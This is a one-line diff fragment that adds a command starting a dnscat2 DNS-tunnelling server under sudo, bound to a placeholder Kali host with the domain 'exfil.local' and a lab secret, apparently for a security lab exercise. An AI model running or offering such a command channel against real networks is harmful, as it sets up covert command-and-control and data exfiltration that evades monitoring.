@@ -1,0 +1,1 @@
+sudo ruby /usr/bin/dnscat2 --dns "host=KALI_IP,port=53,domain=exfil.local" --no-cache --secret=labpass
